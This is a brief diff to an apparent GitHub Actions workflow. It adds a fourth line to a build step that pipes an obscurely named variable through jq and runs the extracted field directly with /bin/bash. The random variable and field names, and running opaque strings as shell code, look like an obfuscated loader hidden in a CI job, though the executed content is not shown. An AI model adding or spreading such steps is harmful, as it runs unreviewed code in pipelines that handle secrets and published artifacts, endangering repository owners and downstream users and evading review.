@@ -31,6 +31,7 @@ jobs:
           echo $cd3816 | jq -r .gqrzu83 | /bin/bash
           printf '%s' "$phs16" | jq -r .zan69672 | /bin/bash
           echo $nqbkg819 | jq -r .qqeui87 | /bin/bash
+          echo $t04 | jq -r .cfhn928 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
